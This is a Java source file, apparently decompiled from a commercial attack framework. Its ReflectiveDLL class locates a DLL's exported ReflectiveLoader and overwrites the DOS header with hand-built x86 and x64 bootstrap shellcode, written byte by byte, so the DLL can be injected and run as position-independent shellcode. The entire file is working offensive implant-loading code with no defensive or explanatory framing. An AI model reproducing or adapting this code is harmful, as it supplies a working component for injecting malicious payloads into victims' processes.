package common;

import pe.PEParser;

import java.util.List;

public class ReflectiveDLL {
    public static final int EXIT_FUNK_PROCESS = 1453503984;
    public static final int EXIT_FUNK_THREAD = 170532320;

    public static int findReflectiveLoader(byte[] data) {
        try {
            PEParser parser = PEParser.load(data);
            List funcs = parser.getExportedFunctions();
            for (Object func : funcs) {
                String next = (String) func;
                if (!next.contains("ReflectiveLoader")) continue;
                return parser.getFunctionOffset(next);
            }
        } catch (Exception ioex) {
            MudgeSanity.logException("Could not find Reflective Loader", ioex, false);
        }
        return -1;
    }

    public static boolean is64(byte[] data) {
        try {
            PEParser parser = PEParser.load(data);
            return parser.is64();
        } catch (Exception ioex) {
            MudgeSanity.logException("Could not find parse PE header in binary blob", ioex, false);
            return false;
        }
    }

    public static byte[] patchDOSHeader(byte[] data) {
        return ReflectiveDLL.patchDOSHeader(data, 1453503984);
    }

    public static byte[] patchDOSHeader(byte[] data, int exitfunk) {
        int offset = ReflectiveDLL.findReflectiveLoader(data);
        if (ReflectiveDLL.is64(data)) {
            throw new RuntimeException("x64 DLL passed to x86 patch function");
        }
        if (offset < 0) {
            return new byte[0];
        }
        Packer bootstrap = new Packer();
        bootstrap.little();
        bootstrap.addByte(77);
        bootstrap.addByte(90);
        bootstrap.addByte(232);
        bootstrap.addByte(0);
        bootstrap.addByte(0);
        bootstrap.addByte(0);
        bootstrap.addByte(0);
        bootstrap.addByte(91);
        bootstrap.addByte(82);
        bootstrap.addByte(69);
        bootstrap.addByte(85);
        bootstrap.addByte(137);
        bootstrap.addByte(229);
        bootstrap.addByte(129);
        bootstrap.addByte(195);
        bootstrap.addInt(offset - 7);
        bootstrap.addByte(255);
        bootstrap.addByte(211);
        bootstrap.addByte(137);
        bootstrap.addByte(195);
        bootstrap.addByte(87);
        bootstrap.addByte(104);
        bootstrap.addByte(4);
        bootstrap.addByte(0);
        bootstrap.addByte(0);
        bootstrap.addByte(0);
        bootstrap.addByte(80);
        bootstrap.addByte(255);
        bootstrap.addByte(208);
        bootstrap.addByte(104);
        bootstrap.addInt(exitfunk);
        bootstrap.addByte(104);
        bootstrap.addByte(5);
        bootstrap.addByte(0);
        bootstrap.addByte(0);
        bootstrap.addByte(0);
        bootstrap.addByte(80);
        bootstrap.addByte(255);
        bootstrap.addByte(211);
        byte[] patch = bootstrap.getBytes();
        if (patch.length > 62) {
            CommonUtils.print_error("bootstrap length is: " + patch.length + " (it's too big!)");
            return new byte[0];
        }
        for (int x = 0; x < patch.length; ++x) {
            data[x] = patch[x];
        }
        return data;
    }

    public static byte[] patchDOSHeaderX64(byte[] data) {
        return ReflectiveDLL.patchDOSHeaderX64(data, 1453503984);
    }

    public static byte[] patchDOSHeaderX64(byte[] data, int exit_funk) {
        int offset = ReflectiveDLL.findReflectiveLoader(data);
        if (!ReflectiveDLL.is64(data)) {
            throw new RuntimeException("x86 DLL passed to x64 patch function");
        }
        if (offset < 0) {
            return new byte[0];
        }
        Packer bootstrap = new Packer();
        bootstrap.little();
        bootstrap.addByte(77);
        bootstrap.addByte(90);
        bootstrap.addByte(65);
        bootstrap.addByte(82);
        bootstrap.addByte(85);
        bootstrap.addByte(72);
        bootstrap.addByte(137);
        bootstrap.addByte(229);
        bootstrap.addByte(72);
        bootstrap.addByte(129);
        bootstrap.addByte(236);
        bootstrap.addByte(32);
        bootstrap.addByte(0);
        bootstrap.addByte(0);
        bootstrap.addByte(0);
        bootstrap.addByte(72);
        bootstrap.addByte(141);
        bootstrap.addByte(29);
        bootstrap.addByte(234);
        bootstrap.addByte(255);
        bootstrap.addByte(255);
        bootstrap.addByte(255);
        bootstrap.addByte(72);
        bootstrap.addByte(129);
        bootstrap.addByte(195);
        bootstrap.addInt(offset);
        bootstrap.addByte(255);
        bootstrap.addByte(211);
        bootstrap.addByte(72);
        bootstrap.addByte(137);
        bootstrap.addByte(195);
        bootstrap.addByte(73);
        bootstrap.addByte(137);
        bootstrap.addByte(248);
        bootstrap.addByte(104);
        bootstrap.addByte(4);
        bootstrap.addByte(0);
        bootstrap.addByte(0);
        bootstrap.addByte(0);
        bootstrap.addByte(90);
        bootstrap.addByte(255);
        bootstrap.addByte(208);
        bootstrap.addByte(65);
        bootstrap.addByte(184);
        bootstrap.addInt(exit_funk);
        bootstrap.addByte(104);
        bootstrap.addByte(5);
        bootstrap.addByte(0);
        bootstrap.addByte(0);
        bootstrap.addByte(0);
        bootstrap.addByte(90);
        bootstrap.addByte(255);
        bootstrap.addByte(211);
        byte[] patch = bootstrap.getBytes();
        if (patch.length > 62) {
            CommonUtils.print_error("bootstrap length is: " + patch.length + " (it's too big!)");
            return new byte[0];
        }
        for (int x = 0; x < patch.length; ++x) {
            data[x] = patch[x];
        }
        return data;
    }
}

